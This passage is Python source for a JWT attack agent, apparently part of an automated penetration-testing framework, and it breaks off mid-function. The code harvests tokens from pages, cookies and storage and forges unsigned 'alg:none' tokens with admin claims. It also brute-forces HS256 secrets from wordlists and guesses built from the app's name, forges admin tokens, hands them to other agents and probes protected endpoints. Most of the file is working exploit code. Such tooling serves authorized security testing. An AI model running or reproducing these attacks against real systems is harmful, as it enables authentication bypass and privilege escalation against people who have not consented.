import asyncio
import json
import base64
import hmac
import hashlib
import jwt
from typing import Dict, List, Optional, Any, Tuple
from pathlib import Path
from loguru import logger

from bugtrace.agents.base import BaseAgent
from bugtrace.agents.worker_pool import WorkerPool, WorkerConfig
from bugtrace.core.llm_client import llm_client
from bugtrace.core.ui import dashboard
from bugtrace.core.queue import queue_manager
from bugtrace.core.event_bus import EventType
from bugtrace.core.config import settings
from bugtrace.core.validation_status import ValidationStatus
from bugtrace.core.http_orchestrator import orchestrator, DestinationType
from bugtrace.reporting.standards import (
    get_cwe_for_vuln,
    get_remediation_for_vuln,
    normalize_severity,
)

# v3.2.0: Import TechContextMixin for context-aware detection
from bugtrace.agents.mixins.tech_context import TechContextMixin

class JWTAgent(BaseAgent, TechContextMixin):
    """
    JWTAgent - Expert in JWT analysis and exploitation.
    Follows the V4 Specialist pattern.
    """

    def __init__(self, event_bus=None):
        super().__init__("JWTAgent", "Authentication & Authorization Specialist", event_bus, agent_id="jwt_agent")
        self.intercepted_tokens = []
        self.findings = []
        self.max_brute_attempts = 1000 # Configurable

        # Queue consumption mode (Phase 20)
        self._queue_mode = False

        # FIX (2026-02-16): Cache protected endpoints for token verification
        self._protected_endpoints: List[str] = []
        self._protected_endpoints_scanned = False

        # Expert deduplication: Track emitted findings by fingerprint
        self._emitted_findings: set = set()  # Agent-specific fingerprint

        # WET â†’ DRY transformation (Two-phase processing)
        self._dry_findings: List[Dict] = []  # Dedup'd findings after Phase A

        self._worker_pool: Optional[WorkerPool] = None
        self._scan_context: str = ""

        # v3.2.0: Context-aware tech stack (loaded in start_queue_consumer)
        self._tech_stack_context: Dict = {}
        self._jwt_prime_directive: str = ""

    # =========================================================================
    # FINDING VALIDATION: JWT-specific validation (Phase 1 Refactor)
    # =========================================================================

    def _validate_before_emit(self, finding: Dict) -> Tuple[bool, str]:
        """
        JWT-specific validation before emitting finding.

        Validates:
        1. Basic requirements (type, url) via parent
        2. Has attack evidence (alg:none, weak secret, key confusion)
        3. Has token or attack type specified
        """
        # Call parent validation first
        is_valid, error = super()._validate_before_emit(finding)
        if not is_valid:
            return False, error

        # Extract from nested structure if needed
        nested = finding.get("finding", {})
        evidence = finding.get("evidence", nested.get("evidence", {}))

        # JWT-specific: Must have attack type or vulnerability type
        attack_type = finding.get("attack_type", nested.get("attack_type", ""))
        vuln_type = finding.get("vulnerability_type", nested.get("vulnerability_type", ""))

        if not (attack_type or vuln_type):
            return False, "JWT requires attack_type or vulnerability_type"

        # JWT-specific: Must have some evidence
        has_token = finding.get("token") or nested.get("token")
        has_proof = evidence.get("forged_token") or evidence.get("cracked_secret") or attack_type
        if not (has_token or has_proof):
            return False, "JWT requires token evidence or attack proof"

        return True, ""

    def _emit_jwt_finding(self, finding_dict: Dict, scan_context: str = None) -> Optional[Dict]:
        """
        Helper to emit JWT finding using BaseAgent.emit_finding() with validation.
        """
        if "type" not in finding_dict:
            finding_dict["type"] = "JWT"

        if scan_context:
            finding_dict["scan_context"] = scan_context

        finding_dict["agent"] = self.name
        return self.emit_finding(finding_dict)

    def _setup_event_subscriptions(self):
        """Subscribe to token discovery events."""
        if self.event_bus:
            self.event_bus.subscribe("auth_token_found", self.handle_new_token)
            logger.info(f"[{self.name}] Subscribed to 'auth_token_found' events.")

    async def handle_new_token(self, data: Dict[str, Any]):
        """Callback when a new token is found by other agents."""
        token = data.get("token")
        source_url = data.get("url")
        location = data.get("location", "unknown")
        
        if token and token not in self.intercepted_tokens:
            self.intercepted_tokens.append(token)
            self.think(f"Intercepted new JWT from {source_url} ({location})")
            await self._analyze_and_exploit(token, source_url, location)

    async def run_loop(self):
        """Main loop for the agent (if started manually or via TeamOrchestrator)."""
        dashboard.current_agent = self.name
        dashboard.log(f"[{self.name}] ðŸš€ JWT Specialist active and listening for tokens...", "INFO")
        
        while self.running:
            await asyncio.sleep(1) # Keep alive for event bus

    async def check_url(self, url: str) -> Dict:
        """Discover tokens on a page and analyze them."""
        tokens = await self._discover_tokens(url)
        for token, location in tokens:
            await self._analyze_and_exploit(token, url, location)
        return {
            "vulnerable": len(self.findings) > 0,
            "findings": self.findings
        }


    async def _scan_page_for_tokens(self, page, target_url, jwt_re, discovered):
        """Scan a single page for JWT tokens in various locations."""
        try:
            self.think(f"Scanning page: {target_url}")
            
            # Intercept headers
            auth_header_token = None
            async def handle_request(request):
                nonlocal auth_header_token
                auth = request.headers.get("authorization")
                if auth and "Bearer " in auth:
                    t = auth.split("Bearer ")[1]
                    if self._is_jwt(t):
                        auth_header_token = t

            page.on("request", handle_request)
            await page.goto(target_url, wait_until="networkidle", timeout=10000)
            
            # Check URL parameters
            await self._check_url_for_tokens(page.url, discovered)
            
            # Check page content
            await self._check_page_content_for_tokens(page, jwt_re, discovered)
            
            # Check storage
            await self._check_storage_for_tokens(page, discovered)
            
            if auth_header_token:
                discovered.append((auth_header_token, "header"))

        except Exception as e:
            logger.debug(f"Scan failed for {target_url}: {e}")

    async def _check_url_for_tokens(self, url, discovered):
        """Check URL parameters for JWT tokens."""
        from urllib.parse import urlparse, parse_qs
        
        p_curr = urlparse(url)
        p_params = parse_qs(p_curr.query)
        for val_list in p_params.values():
            for val in val_list:
                if self._is_jwt(val):
                    discovered.append((val, "url_param"))

    async def _check_page_content_for_tokens(self, page, jwt_re, discovered):
        """Check page links and text for JWT tokens."""
        data = await page.evaluate("""
            () => ({
                links: Array.from(document.querySelectorAll('a[href]')).map(a => a.href),
                text: document.body.innerText,
                html: document.documentElement.innerHTML
            })
        """)

        # Check Links
        self._check_page_links_for_tokens(data['links'], discovered)

        # Check Text/HTML for JWT strings
        self._check_page_text_for_tokens(jwt_re, data, discovered)

    def _check_page_links_for_tokens(self, links: List[str], discovered: List):
        """Check page links for JWT tokens in URL parameters."""
        for link in links:
            self._check_single_link_for_tokens(link, discovered)

    def _check_single_link_for_tokens(self, link: str, discovered: List):
        """Check a single link for JWT tokens in URL parameters."""
        from urllib.parse import urlparse, parse_qs

        p_link = urlparse(link)
        l_params = parse_qs(p_link.query)
        for val_list in l_params.values():
            for val in val_list:
                if not self._is_jwt(val):
                    continue
                discovered.append((val, "link_param"))

    def _check_page_text_for_tokens(self, jwt_re, data: Dict, discovered: List):
        """Check page text and HTML for JWT token strings."""
        matches = jwt_re.findall(data['text']) + jwt_re.findall(data['html'])
        for m in matches:
            if not self._is_jwt(m):
                continue
            discovered.append((m, "body_text"))

    async def _check_storage_for_tokens(self, page, discovered):
        """Check cookies and localStorage for JWT tokens."""
        import json
        
        cookies = await page.context.cookies()
        for cookie in cookies:
            if self._is_jwt(cookie['value']):
                discovered.append((cookie['value'], "cookie"))
        
        storage = await page.evaluate("() => JSON.stringify(localStorage)")
        storage_dict = json.loads(storage)
        for k, v in storage_dict.items():
            if isinstance(v, str) and self._is_jwt(v):
                discovered.append((v, "localStorage"))


    async def _discover_tokens(self, url: str) -> List[Tuple[str, str]]:
        """Use browser to find JWTs in URL, cookies, local storage, page links, and body text."""
        from bugtrace.tools.visual.browser import browser_manager
        from urllib.parse import urlparse, parse_qs
        import re

        discovered = []
        self.think(f"ðŸ” Starting token discovery for {url}")

        jwt_re = re.compile(r'(eyJ[a-zA-Z0-9_-]{10,}\.eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]*)')

        # Check initial URL parameters
        await self._check_url_for_tokens(url, discovered)

        async with browser_manager.get_page() as page:
            # Scan target URL
            await self._scan_page_for_tokens(page, url, jwt_re, discovered)

            # Heuristic: If nothing found, try root page
            if not discovered:
                root_url = self._get_root_url(url)
                if root_url:
                    self.think(f"No tokens found on target. Trying landing page: {root_url}")
                    await self._scan_page_for_tokens(page, root_url, jwt_re, discovered)

        return self._deduplicate_tokens(discovered)

    def _get_root_url(self, url: str):
        """Get root URL if current URL has a path."""
        from urllib.parse import urlparse

        p = urlparse(url)
        if p.path != "/" and p.path != "":
            return f"{p.scheme}://{p.netloc}/"
        return None

    def _deduplicate_tokens(self, discovered):
        """Remove duplicate tokens and log discoveries."""
        unique = {}
        for t, loc in discovered:
            if t not in unique:
                unique[t] = loc
                self.think(f"ðŸŽ¯ Discovered token at {loc}: {t[:20]}...")
        return list(unique.items())

    def _is_jwt(self, token: str) -> bool:
        """Heuristic to check if a string looks like a JWT."""
        parts = token.split('.')
        return len(parts) == 3 and all(len(p) > 4 for p in parts[:2])

    def _decode_token(self, token: str) -> Optional[Dict]:
        """Decode JWT parts without verification."""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None
            
            header = json.loads(self._base64_decode(parts[0]))
            payload = json.loads(self._base64_decode(parts[1]))
            signature = parts[2]
            
            return {
                "header": header,
                "payload": payload,
                "signature": signature,
                "raw": token
            }
        except Exception as e:
            logger.warning(f"[{self.name}] Failed to decode token: {e}")
            return None

    def _base64_decode(self, data: str) -> str:
        """Base64Url decode helper."""
        missing_padding = len(data) % 4
        if missing_padding:
            data += '=' * (4 - missing_padding)
        return base64.urlsafe_b64decode(data).decode('utf-8')

    async def _verify_token_works(self, forged_token: str, url: str, location: str) -> bool:
        """
        Sends a request with the forged token to verify validation bypass.
        FIX (2026-02-16): If original URL is public (200 without auth), discover
        protected endpoints (401/403) and test the forged token there.
        """
        try:
            # First test against original URL
            base_status, base_text, _ = await self._token_execute_baseline(url, location)
            status, text, final_attack_url = await self._token_execute_test(url, forged_token, location)
            self._token_log_verification(final_attack_url, base_status, status, base_text, text)

            if self._token_analyze_response(base_status, status, base_text, text):
                return True

            # If original URL is public (both baseline and test return 200),
            # try protected endpoints instead.
            if base_status == 200:
                protected = await self._get_protected_endpoints(url)
                for purl in protected[:5]:  # Test max 5 protected endpoints
                    try:
                        p_base_status, p_base_text, _ = await self._token_execute_baseline(purl, "header")
                        if p_base_status not in (401, 403):
                            continue  # Not actually protected
                        p_status, p_text, p_final = await self._token_execute_test(purl, forged_token, "header")
                        self._token_log_verification(p_final, p_base_status, p_status, p_base_text, p_text)
                        if self._token_analyze_response(p_base_status, p_status, p_base_text, p_text):
                            return True
                    except Exception:
                        continue

                # Fallback: APIs that always return 200 but differ in body content
                if base_status == 200 and status == 200:
                    if self._body_shows_privilege_difference(base_text, text):
                        self.think("SUCCESS: Body content differs â€” forged token grants different access")
                        return True

            return False
        except Exception as e:
            logger.debug(f"Token verification failed: {e}")
            return False

    async def _get_protected_endpoints(self, source_url: str) -> List[str]:
        """Discover endpoints that require authentication (return 401/403)."""
        if self._protected_endpoints_scanned:
            return self._protected_endpoints

        self._protected_endpoints_scanned = True
        from urllib.parse import urlparse

        parsed = urlparse(source_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Read recon URLs if available
        report_dir = getattr(self, 'report_dir', None)
        if not report_dir:
            return []

        urls_file = report_dir / "recon" / "urls.txt"
        if not urls_file.exists():
            return []

        # Common auth-required path patterns
        auth_patterns = [
            "/admin", "/dashboard", "/profile", "/account", "/me",
            "/user", "/settings", "/orders", "/cart",
        ]

        candidate_urls = set()
        for line in urls_file.read_text().splitlines():
            line = line.strip()
            if not line:
                continue
            lp = urlparse(line)
            path_lower = lp.path.lower()
            if any(p in path_lower for p in auth_patterns):
                candidate_urls.add(line.split("?")[0])  # Strip query params

        # Also try common protected paths directly
        for pattern in auth_patterns:
            candidate_urls.add(f"{base}/api{pattern}")
            candidate_urls.add(f"{base}{pattern}")

        # Test candidates for 401/403 using a clean session (no shared cookies/state)
        import aiohttp
        logger.info(f"[{self.name}] Probing {min(len(candidate_urls), 20)} candidate URLs for protected endpoints")
        try:
            async with aiohttp.ClientSession() as clean_session:
                for curl in list(candidate_urls)[:20]:
                    try:
                        async with clean_session.get(curl, timeout=aiohttp.ClientTimeout(total=5), ssl=False) as resp:
                            if resp.status in (401, 403):
                                self._protected_endpoints.append(curl)
                                logger.info(f"[{self.name}] Found protected endpoint: {curl} ({resp.status})")
                                if len(self._protected_endpoints) >= 3:
                                    break
                    except Exception as e:
                        logger.debug(f"[{self.name}] Probe failed for {curl}: {e}")
                        continue
        except Exception as e:
            logger.debug(f"[{self.name}] Protected endpoint scan failed: {e}")

        logger.info(f"[{self.name}] Discovered {len(self._protected_endpoints)} protected endpoints")
        return self._protected_endpoints

    async def _token_execute_baseline(self, url: str, location: str) -> Tuple[int, str, str]:
        """Execute baseline request with invalid token."""
        return await self._token_make_request(url, "invalid.token.123", location)

    async def _token_execute_test(self, url: str, forged_token: str, location: str) -> Tuple[int, str, str]:
        """Execute test request with forged token."""
        return await self._token_make_request(url, forged_token, location)

    async def _rate_limit(self):
        """Rate limiting to prevent WAF triggers and server overload."""
        import asyncio
        delay = settings.JWT_RATE_LIMIT_DELAY
        if delay > 0:
            await asyncio.sleep(delay)

    async def _token_make_request(self, target_url: str, token: str, loc: str) -> Tuple[int, str, str]:
        """Make HTTP request with token in appropriate location."""
        import aiohttp
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        # Apply rate limiting before request
        await self._rate_limit()

        headers = {}
        final_url = target_url

        if loc == "header":
            headers["Authorization"] = f"Bearer {token}"
        elif loc == "cookie":
            headers["Cookie"] = f"session={token}"
        elif "param" in loc or loc == "manual":
            final_url, headers = self._token_inject_param(target_url, token, loc, headers)

        async with orchestrator.session(DestinationType.TARGET) as session:
            async with session.get(final_url, headers=headers, timeout=5) as r:
                body = await r.text()
                return r.status, body, final_url

    def _token_inject_param(self, target_url: str, token: str, loc: str, headers: Dict) -> Tuple[str, Dict]:
        """Inject token into URL parameter."""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        p = urlparse(target_url)
        qs = parse_qs(p.query)

        found_param = False
        for k, v in qs.items():
            if any(self._is_jwt(val) for val in v):
                qs[k] = [token]
                found_param = True

        if not found_param and loc == "manual":
            qs["token"] = [token]

        new_query = urlencode(qs, doseq=True)
        final_url = urlunparse((p.scheme, p.netloc, p.path, p.params, new_query, p.fragment))

        # Fallback for manual: also try as a header
        if loc == "manual" and not found_param:
            headers["Authorization"] = f"Bearer {token}"

        return final_url, headers

    def _token_log_verification(self, final_url: str, base_status: int, status: int, base_text: str, text: str):
        """Log verification attempt details."""
        self.think(f"Requesting: {final_url}")
        self.think(f"Verification: Base Status={base_status} vs Forged Status={status}")
        self.think(f"Base Body: '{base_text[:50]}...' | Forged Body: '{text[:50]}...'")

    def _token_analyze_response(self, base_status: int, status: int, base_text: str, text: str) -> bool:
        """Analyze response to determine if token validation was bypassed."""
        success_keywords = ["welcome", "admin", "logged in", "flag", "success", "bt7331", "role: admin", "MASTER_PASS", "ROOT_KEY"]
        fail_keywords = ["invalid", "unauthorized", "expired", "forbidden", "anonymous", "invalid token", "blocked"]

        text_lower = text.lower()
        base_text_lower = base_text.lower()

        # Check status code change
        if base_status in [401, 403] and status == 200:
            self.think("SUCCESS: Status code change detected (Error -> 200)")
            return True

        # Check content-based indicators
        if status == 200:
            # Success markers appeared
            for sk in success_keywords:
                if sk in text_lower and sk not in base_text_lower:
                    self.think(f"SUCCESS: Content-based indicator found '{sk}'")
                    return True

            # Fail markers disappeared
            for fk in fail_keywords:
                if fk in base_text_lower and fk not in text_lower:
                    self.think(f"SUCCESS: Content-based indicator - failure marker '{fk}' disappeared")
                    return True

        return False

    def _body_shows_privilege_difference(self, base_text: str, auth_text: str) -> bool:
        """
        Compare response bodies to detect privilege differences when both return 200.

        Checks:
        1. JSON key differences (auth response has extra keys)
        2. Array length differences (auth response returns more data)
        3. Privilege keywords present in auth response but not baseline
        4. Bodies are not identical (token actually changes something)
        """
        import json

        # Identical responses â†’ token has no effect
        if base_text.strip() == auth_text.strip():
            return False

        # Both empty â†’ no difference
        if not base_text.strip() and not auth_text.strip():
            return False

        # Check for privilege keywords in auth response but not in baseline
        privilege_keywords = [
            "admin", "superuser", "permissions", "role", "privilege",
            "all_users", "is_admin", "is_staff", "elevated", "root",
        ]
        auth_lower = auth_text.lower()
        base_lower = base_text.lower()

        new_privilege_keywords = sum(
            1 for kw in privilege_keywords
            if kw in auth_lower and kw not in base_lower
        )
        if new_privilege_keywords >= 2:
            logger.info(f"[{self.name}] Body diff: {new_privilege_keywords} privilege keywords appeared")
            return True

        # Try JSON comparison
        try:
            base_json = json.loads(base_text)
            auth_json = json.loads(auth_text)
        except (json.JSONDecodeError, TypeError):
            # Not JSON â€” check raw length difference (auth response significantly larger)
            if len(auth_text) > len(base_text) * 1.5 and len(auth_text) - len(base_text) > 100:
                logger.info(f"[{self.name}] Body diff: auth response significantly larger "
                            f"({len(auth_text)} vs {len(base_text)} bytes)")
                return True
            return False

        # Compare JSON objects
        if isinstance(base_json, dict) and isinstance(auth_json, dict):
            # New keys in auth response
            new_keys = set(auth_json.keys()) - set(base_json.keys())
            if new_keys:
                logger.info(f"[{self.name}] Body diff: auth response has new keys: {new_keys}")
                return True

            # Check for value changes in privilege-related fields
            for key in auth_json:
                if key in base_json and auth_json[key] != base_json[key]:
                    if any(kw in key.lower() for kw in privilege_keywords):
                        logger.info(f"[{self.name}] Body diff: privilege field '{key}' changed")
                        return True

        # Compare JSON arrays (auth returns more items)
        if isinstance(base_json, list) and isinstance(auth_json, list):
            if len(auth_json) > len(base_json) and len(auth_json) - len(base_json) >= 2:
                logger.info(f"[{self.name}] Body diff: auth response has more items "
                            f"({len(auth_json)} vs {len(base_json)})")
                return True

        return False

    async def _check_none_algorithm(self, token: str, url: str, location: str) -> bool:
        """Attempt 'none' algorithm attack."""
        parts = token.split('.')
        if len(parts) != 3:
            return False

        header = self._none_alg_decode_header(parts)
        if not header:
            return False

        # Test all algorithm variations
        variations = ['none', 'None', 'NONE', 'nOnE']
        for alg in variations:
            if await self._none_alg_test_variant(alg, header, parts, url, location):
                return True

        return False

    def _none_alg_decode_header(self, parts: List[str]) -> Optional[Dict]:
        """Decode JWT header for none algorithm attack."""
        try:
            return json.loads(self._base64_decode(parts[0]))
        except (json.JSONDecodeError, ValueError, TypeError):
            return None

    async def _none_alg_test_variant(self, alg: str, header: Dict, parts: List[str], url: str, location: str) -> bool:
        """Test single 'none' algorithm variant."""
        # Build modified header
        new_header = header.copy()
        new_header['alg'] = alg

        h_json = json.dumps(new_header, separators=(',', ':')).encode()
        h_b64 = base64.urlsafe_b64encode(h_json).decode().strip('=')

        # Build privileged payload
        p_b64 = self._none_alg_build_payload(parts)

        # Test both token formats
        if await self._none_alg_test_with_dot(h_b64, p_b64, alg, url, location):
            return True
        if await self._none_alg_test_without_dot(h_b64, p_b64, alg, url, location):
            return True

        return False

    def _none_alg_build_payload(self, parts: List[str]) -> str:
        """Build elevated privilege payload for none algorithm attack."""
        try:
            payload = json.loads(self._base64_decode(parts[1]))
            payload['admin'] = True
            payload['role'] = 'admin'
            p_json = json.dumps(payload, separators=(',', ':')).encode()
            return base64.urlsafe_b64encode(p_json).decode().strip('=')
        except Exception:
            return parts[1]  # Fallback to original

    async def _none_alg_test_with_dot(self, h_b64: str, p_b64: str, alg: str, url: str, location: str) -> bool:
        """Test none algorithm with trailing dot format."""
        forged_token = f"{h_b64}.{p_b64}."
        if await self._verify_token_works(forged_token, url, location):
            self.think(f"SUCCESS: 'none' algorithm bypass confirmed with alg={alg}")
            self.findings.append({
                "type": "JWT None Algorithm",
                "url": url,
                "parameter": "alg",
                "payload": f"alg:{alg}",
                "severity": normalize_severity("CRITICAL").value,
                "cwe_id": get_cwe_for_vuln("JWT"),  # CWE-347
                "cve_id": "N/A",  # Vulnerability class, not specific CVE
                "remediation": get_remediation_for_vuln("JWT"),
                "validated": True,
                "status": "VALIDATED_CONFIRMED",
                "description": f"JWT None Algorithm bypass vulnerability. The server accepts tokens with algorithm set to '{alg}', allowing signature verification to be bypassed. An attacker can forge arbitrary tokens without knowing the secret key.",
                "reproduction": f"# Forge JWT with 'none' algorithm:\n# 1. Decode header, change 'alg' to '{alg}'\n# 2. Remove signature (keep trailing dot)\n# Forged token: {forged_token[:50]}...",
                "http_request": f"GET {url} with forged token in Authorization header",
                "http_response": "200 OK with elevated privileges"
            })
            return True
        return False

    async def _none_alg_test_without_dot(self, h_b64: str, p_b64: str, alg: str, url: str, location: str) -> bool:
        """Test none algorithm without trailing dot format."""
        forged_token_nodot = f"{h_b64}.{p_b64}"
        if await self._verify_token_works(forged_token_nodot, url, location):
            self.think(f"SUCCESS: 'none' algorithm bypass (no dot) confirmed with alg={alg}")
            self.findings.append({
                "type": "JWT None Algorithm",
                "url": url,
                "parameter": "alg",
                "payload": f"alg:{alg} (no dot)",
                "severity": normalize_severity("CRITICAL").value,
                "cwe_id": get_cwe_for_vuln("JWT"),  # CWE-347
                "cve_id": "N/A",  # Vulnerability class, not specific CVE
                "remediation": get_remediation_for_vuln("JWT"),
                "validated": True,
                "status": "VALIDATED_CONFIRMED",
                "description": f"JWT None Algorithm bypass vulnerability (no trailing dot variant). The server accepts tokens with algorithm '{alg}' without a trailing dot, allowing complete signature bypass.",
                "reproduction": f"# Forge JWT with 'none' algorithm (no trailing dot):\n# Forged token: {forged_token_nodot[:50]}...",
                "http_request": f"GET {url} with forged token in Authorization header",
                "http_response": "200 OK with elevated privileges"
            })
            return True
        return False

    async def _attack_brute_force(self, token: str, url: str, location: str):
        """Offline dictionary attack on HMAC secret."""
        decoded = self._decode_token(token)
        if not decoded or decoded['header'].get('alg') != 'HS256':
            return

        self.think("Starting dictionary attack on HS256 secret...")

        parts = token.split('.')
        signing_input, signature_actual = self._prepare_brute_force(parts)
        if not signature_actual:
            return

        # FIX (2026-02-16): Fetch root page to extract app name for dynamic secrets.
        # Developers commonly use app names in JWT secrets (e.g., "bugstore_secret_2024").
        extra_names = await self._extract_app_name_from_root(url)

        # Load wordlist from file + target-specific patterns
        wordlist = self._load_jwt_wordlist(url, extra_names=extra_names)

        for secret in wordlist:
            if self._test_secret(signing_input, signature_actual, secret):
                await self._exploit_cracked_secret(secret, decoded, parts, token, url, location)
                return

    async def _extract_app_name_from_root(self, url: str) -> List[str]:
        """Fetch root URL and extract potential app name from welcome message / API response."""
        import re
        from urllib.parse import urlparse
        import aiohttp

        parsed = urlparse(url)
        root_url = f"{parsed.scheme}://{parsed.netloc}/"
        names = []

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(root_url, timeout=aiohttp.ClientTimeout(total=5), ssl=False) as resp:
                    text = await resp.text()

            # Extract CamelCase words (e.g., "BugStore" â†’ "bugstore")
            for match in re.findall(r'\b([A-Z][a-z]+(?:[A-Z][a-z]+)+)\b', text):
                w = match.lower()
                if len(w) >= 4 and w not in ("welcome", "message", "status", "running", "version", "error"):
                    names.append(w)

            # Extract quoted strings that could be app names (e.g., "Welcome to BugStore API")
            for match in re.findall(r'"([^"]{3,30})"', text):
                words = match.split()
                for word in words:
                    w = word.lower().strip()
                    if len(w) >= 4 and w.isalpha() and w not in ("welcome", "message", "status", "running", "version", "error", "true", "false", "null"):
                        names.append(w)

            # Also try HTML <title> if present
            title_match = re.search(r'<title[^>]*>([^<]+)</title>', text, re.IGNORECASE)
            if title_match:
                for word in re.split(r'[\s\-_|]+', title_match.group(1)):
                    w = word.lower().strip()
                    if len(w) >= 3 and w.isalpha():
                        names.append(w)

            # Deduplicate
            names = list(dict.fromkeys(names))
            if names:
                logger.info(f"[{self.name}] Extracted app names from root page: {names}")

        except Exception as e:
            logger.debug(f"[{self.name}] Failed to fetch root URL for name extraction: {e}")

        return names

    def _load_jwt_wordlist(self, url: str = "", extra_names: List[str] = None) -> List[str]:
        """Load JWT secret wordlist from file + generate target-specific patterns."""
        wordlist_path = settings.BASE_DIR / "bugtrace" / "data" / "jwt_secrets.txt"

        try:
            with open(wordlist_path, 'r') as f:
                # Skip comments and empty lines
                wordlist = [
                    line.strip()
                    for line in f
                    if line.strip() and not line.strip().startswith('#')
                ]
            logger.debug(f"[{self.name}] Loaded {len(wordlist)} secrets from wordlist")
        except Exception as e:
            logger.warning(f"[{self.name}] Failed to load wordlist: {e}, using fallback")
            wordlist = ["secret", "password", "123456", "jwt", "key", "auth", "admin", "token", "1234567890", "mysupersecret"]

        # FIX (2026-02-16): Generate target-specific secret patterns from hostname/path.
        # Developers commonly use app name in JWT secrets (e.g., "myapp_secret_2024").
        all_names = []
        if url:
            all_names = self._extract_target_names(url)
        if extra_names:
            all_names = list(set(all_names + extra_names))

        if all_names:
            dynamic_secrets = self._generate_name_based_secrets(all_names)
            if dynamic_secrets:
                logger.info(f"[{self.name}] Generated {len(dynamic_secrets)} target-specific secrets from names: {all_names}")
                wordlist = dynamic_secrets + wordlist  # Target-specific first (more likely)

        return wordlist

    def _extract_target_names(self, url: str) -> List[str]:
        """Extract potential app/service names from URL + recon data for secret generation."""
        from urllib.parse import urlparse
        import re

        names = set()
        parsed = urlparse(url)

        # From hostname: "bugstore.example.com" â†’ "bugstore"
        hostname = parsed.hostname or ""
        parts = hostname.replace("-", ".").replace("_", ".").split(".")
        generic_parts = {"www", "api", "app", "dev", "staging", "test",
                         "localhost", "com", "org", "net", "io", "co",
                         "uk", "us", "eu", "127", "0"}
        for part in parts:
            part = part.lower().strip()
            if part and part not in generic_parts and not part.isdigit():
                names.add(part)

        # From path: look for service name patterns
        path_parts = [p for p in parsed.path.split("/") if p and p not in ("api", "v1", "v2", "v3")]
        if path_parts:
            names.add(path_parts[0].lower())

        # From recon data: scan HTML titles, API responses, page content for app name hints
        report_dir = getattr(self, 'report_dir', None)
        if report_dir:
            # Try to read the target page title from recon captures
            try:
                captures_dir = report_dir / "captures"
                if captures_dir.exists():
                    import glob as glob_mod
                    for html_file in glob_mod.glob(str(captures_dir / "*.html"))[:3]:
                        with open(html_file, 'r', errors='ignore') as f:
                            content = f.read(5000)
                        # Extract <title>
                        title_match = re.search(r'<title[^>]*>([^<]+)</title>', content, re.IGNORECASE)
                        if title_match:
                            title = title_match.group(1).strip()
                            for word in re.split(r'[\s\-_|]+', title):
                                word = word.lower().strip()
                                if len(word) >= 3 and word not in generic_parts and word.isalpha():
                                    names.add(word)
            except Exception:
                pass

            # Read recon URLs for hostname-based names
            urls_file = report_dir / "recon" / "urls.txt"
            if urls_file and urls_file.exists():
                try:
                    for line in urls_file.read_text().splitlines()[:50]:
                        lp = urlparse(line.strip())
                        rhost = lp.hostname or ""
                        for rp in rhost.replace("-", ".").replace("_", ".").split("."):
                            rp = rp.lower().strip()
                            if rp and rp not in generic_parts and not rp.isdigit():
                                names.add(rp)
                except Exception:
                    pass

        # Additional names from async callers (e.g., _attack_brute_force fetches root page)
        # are passed via extra_names parameter to _load_jwt_wordlist, not extracted here.

        return list(names)

    def _generate_name_based_secrets(self, names: List[str]) -> List[str]:
        """Generate common secret patterns from extracted app names."""
        import datetime
        current_year = datetime.datetime.now().year
        years = [str(current_year), str(current_year - 1), str(current_year - 2)]

        suffixes = [
            "_secret", "-secret", "secret",
            "_key", "-key", "key",
            "_jwt", "-jwt",
            "_token", "-token",
            "_api", "-api",
            "123", "_123",
        ]

        secrets = []
        for name in names:
            # Direct name
            secrets.append(name)

            # name + suffix
            for suffix in suffixes:
                secrets.append(f"{name}{suffix}")

            # name + suffix + year
            for suffix in ["_secret_", "-secret-", "_key_", "_secret", "_jwt_"]:
                for year in years:
                    secrets.append(f"{name}{suffix}{year}")

            # name + year
            for year in years:
                secrets.append(f"{name}_{year}")
                secrets.append(f"{name}{year}")

        return secrets

    def _prepare_brute_force(self, parts: List[str]) -> Tuple[bytes, Optional[bytes]]:
        """Prepare signing input and signature for brute force."""
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        try:
            signature_actual = base64.urlsafe_b64decode(parts[2] + "==")
            return signing_input, signature_actual
        except (ValueError, TypeError):
            return signing_input, None

    def _test_secret(self, signing_input: bytes, signature_actual: bytes, secret: str) -> bool:
        """Test if secret matches signature."""
        h = hmac.new(secret.encode(), signing_input, hashlib.sha256)
        return h.digest() == signature_actual

    async def _exploit_cracked_secret(self, secret: str, decoded: Dict, parts: List[str], token: str, url: str, location: str):
        """Exploit cracked JWT secret by forging admin token."""
        self.think(f"ðŸ”¥ CRITICAL: Found weak JWT secret: '{secret}'")

        forged_token = self._forge_admin_token(decoded, parts, secret)

        # Store forged token for cross-agent auth chaining
        if self._scan_context:
            from bugtrace.services.scan_context import store_auth_token
            store_auth_token(self._scan_context, "jwt_forged_admin", forged_token)
            logger.info(f"[{self.name}] Stored forged admin token for cross-agent auth chaining")

        self.findings.append({
            "type": "Weak JWT Secret",
            "url": url,
            "parameter": "header",
            "payload": secret,
            "evidence": f"Secret cracked: {secret}. Forged admin token created.",
            "severity": normalize_severity("CRITICAL").value,
            "cwe_id": get_cwe_for_vuln("JWT"),  # CWE-347
            "cve_id": "N/A",  # Vulnerability class, not specific CVE
            "remediation": get_remediation_for_vuln("JWT"),
            "validated": True,
            "status": "VALIDATED_CONFIRMED",
            "description": f"Weak JWT secret discovered via dictionary attack. The HS256 signing secret is '{secret}', allowing attackers to forge arbitrary tokens including admin tokens.",
            "reproduction": f"# Crack JWT secret and forge admin token:\nimport jwt\nforged = jwt.encode({{'admin': True, 'role': 'admin'}}, '{secret}', algorithm='HS256')\nprint(forged)",
            "http_request": f"GET {url} with forged token",
            "http_response": "200 OK with admin privileges"
        })

        if await self._verify_token_works(forged_token, url, location):
            self.think("SUCCESS: Admin privilege escalation confirmed!")
            # FIX (2026-02-16): Post-exploitation â€” probe authenticated endpoints
            # for common vulns (RCE, SSTI) that are only reachable with admin JWT.
            await self._post_exploit_authenticated_scan(secret, decoded, forged_token, url)

    def _forge_admin_token(self, decoded: Dict, parts: List[str], secret: str) -> str:
        """Forge admin JWT token with cracked secret."""
        new_payload = decoded['payload'].copy()
        new_payload['admin'] = True
        new_payload['role'] = 'admin'
        if 'user' in new_payload:
            new_payload['user'] = 'admin'

        p_json = json.dumps(new_payload, separators=(',', ':')).encode()
        p_b64 = base64.urlsafe_b64encode(p_json).decode().strip('=')

